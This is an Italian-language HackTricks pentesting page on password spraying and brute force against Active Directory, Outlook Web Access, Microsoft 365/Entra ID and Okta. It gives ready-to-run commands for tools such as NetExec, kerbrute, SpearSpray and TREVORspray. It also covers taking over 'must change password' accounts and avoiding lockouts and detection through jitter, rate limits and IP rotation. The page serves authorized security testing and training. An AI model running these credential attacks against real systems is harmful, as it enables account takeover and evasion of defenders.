# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Una volta trovati diversi **username validi**, puoi provare le **password più comuni** (tenendo presente la policy delle password dell'ambiente) con ciascuno degli utenti individuati.\
Per impostazione **predefinita**, la **lunghezza** **minima** della **password** è **7**.

Anche le liste di username comuni potrebbero essere utili: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Tieni presente che **potresti bloccare alcuni account se provi diverse password errate** (per impostazione predefinita, più di 10).

### Ottenere la policy delle password

Se disponi delle credenziali di un utente o di una shell come utente di dominio, puoi **ottenere la policy delle password con**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation da Linux (o tutti)

- Utilizzando **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Utilizzo di **NetExec (CME successor)** per eseguire password spraying mirato e a basso rumore tramite SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Utilizzando [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(puoi indicare il numero di tentativi per evitare i blocchi):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Utilizzando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - **NON RACCOMANDATO, A VOLTE NON FUNZIONA**<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Con il modulo `scanner/smb/smb_login` di **Metasploit**:

![Password Spraying - Brute-Force: Con il modulo scanner/smb/smb login di Metasploit](<../../images/image (745).png>)

- Utilizzando **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Da Windows

- Con una versione di [Rubeus](https://github.com/Zer1t0/Rubeus) dotata del modulo brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Può generare gli utenti dal dominio per impostazione predefinita e ottenere la password policy dal dominio, limitando i tentativi in base ad essa):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Con [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identificare e prendere il controllo degli account con "Password must change at next logon" (SAMR)

Una tecnica a basso rumore consiste nell'eseguire uno spray con una password innocua/vuota e individuare gli account che restituiscono STATUS_PASSWORD_MUST_CHANGE, indicando che la password è stata forzatamente fatta scadere e può essere modificata senza conoscere quella precedente.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Enumerare gli utenti (RID brute tramite SAMR) per creare l'elenco dei target:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spraya una password vuota e continua sugli hit per acquisire gli account che devono cambiare password al prossimo accesso:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Per ogni credenziale valida, cambia la password tramite SAMR con il modulo di NetExec (non è necessaria la vecchia password quando è impostato "must change"):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Note operative:
- Assicurati che l'orologio del tuo host sia sincronizzato con il DC prima delle operazioni basate su Kerberos: `sudo ntpdate <dc_fqdn>`.
- Un [+] senza (Pwn3d!) in alcuni moduli (ad esempio RDP/WinRM) significa che le credenziali sono valide, ma all'account mancano i diritti di accesso interattivo.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying con targeting LDAP e throttling consapevole dei PSO (SpearSpray)

Lo spraying basato sulla pre-auth di Kerberos riduce il rumore rispetto ai tentativi di SMB/NTLM/LDAP bind e si allinea meglio alle policy di lockout di AD. SpearSpray combina il targeting basato su LDAP, un pattern engine e la consapevolezza delle policy (domain policy + PSO + buffer di badPwdCount) per eseguire lo spraying in modo preciso e sicuro. Può inoltre contrassegnare i principal compromessi in Neo4j per il pathing di BloodHound.<sup>[[1]](#references)</sup>

Idee chiave:
- Individuazione degli utenti tramite LDAP con paging e supporto LDAPS, con possibilità di usare filtri LDAP personalizzati.
- Filtraggio basato sulla domain lockout policy e sui PSO per lasciare un buffer di tentativi configurabile (threshold) ed evitare di bloccare gli utenti.
- Validazione della pre-auth di Kerberos tramite fast gssapi bindings (genera eventi 4768/4771 sui DC invece di 4625).
- Generazione di password per-utente basata su pattern, usando variabili come nomi e valori temporali derivati dal pwdLastSet di ciascun utente.
- Controllo del throughput tramite threads, jitter e numero massimo di richieste al secondo.
- Integrazione opzionale con Neo4j per contrassegnare gli utenti owned in BloodHound.

Utilizzo di base e discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Targeting e controllo dei pattern:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Controlli di stealth e sicurezza:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Arricchimento di Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Panoramica del sistema di pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Note operative:

- Privilegia le query al PDC-emulator con -dc per leggere il valore badPwdCount più autorevole e le informazioni relative alle policy.
- I reset di badPwdCount vengono attivati al tentativo successivo alla finestra di osservazione; usa soglia e tempistiche per rimanere al sicuro.
- I tentativi di pre-autenticazione Kerberos emergono nella telemetria dei DC come 4768/4771; usa jitter e rate-limiting per mimetizzarti.

> Suggerimento: la dimensione predefinita delle pagine LDAP di SpearSpray è 200; modificala secondo necessità con -lps.

## Outlook Web Access

Esistono diversi strumenti per il p**assword spraying outlook**.

- Con [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Con [Ruler](https://github.com/sensepost/ruler) (affidabile!)<sup>[[5]](#references)</sup>
- Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Per usare uno qualsiasi di questi strumenti, sono necessari un elenco di utenti e una password oppure un piccolo elenco di password da testare.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Per il cloud spraying, identifica innanzitutto se il tenant è **managed**, **federated** o **hybrid**, perché l'endpoint e il comportamento del lockout possono differire da quelli dell'AD on-prem. In Microsoft Entra, **Smart Lockout** modifica il modo in cui i tentativi ripetuti consumano il budget di lockout:<sup>[[7]](#references)</sup>

- Ripetere la **stessa password errata** non continua a incrementare il contatore di lockout, ma provare **nuovi candidati** sì.
- Le posizioni **familiar** e **unfamiliar** hanno contatori separati.
- I tenant che usano **pass-through authentication (PTA)** non beneficiano del tracciamento degli hash delle password errate, quindi trattali più come target classici sensibili al lockout.

In pratica, esegui lo spray di **una password per round**, mantieni una spaziatura sufficiente tra i round e preferisci tool in grado di individuare l'effettivo auth flow del tenant prima di inviare i tentativi.

- Con [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), puoi fare recon del tenant, individuare il `token_endpoint`, eseguire lo spray su `msol`/`adfs`/`owa`/`okta` e ruotare il traffico attraverso più egress IP:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Con [**Spray365**](https://github.com/MarkoH17/Spray365), puoi pre-generare un **piano di esecuzione** riprendibile, randomizzare l'ordine di autenticazione e imporre un **ritardo minimo per utente** per restare al di fuori della finestra di blocco:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Con [**o365spray**](https://github.com/0xZDH/o365spray), puoi validare il tenant, enumerare gli utenti con moduli come `onedrive` ed eseguire lo spray tramite `oauth2` o `adfs`, mantenendo **un solo tentativo per utente** durante ogni finestra di lockout. Se disponi già di una API FireProx, passala con `--proxy-url` per distribuire gli indirizzi IP di origine:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Il tradecraft degli operatori recenti si è orientato anche verso lo **spraying cloud distribuito**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) supporta finestre temporali, rimescolamento delle password, spraying su ADFS/M365 ed esfiltrazione post-autenticazione automatica. Recenti abusi reali hanno inoltre utilizzato l'enumerazione degli account tramite **Microsoft Teams API** e la rotazione delle regioni **AWS** per distribuire le ondate di spray tra più aree geografiche di origine.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Riferimenti

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
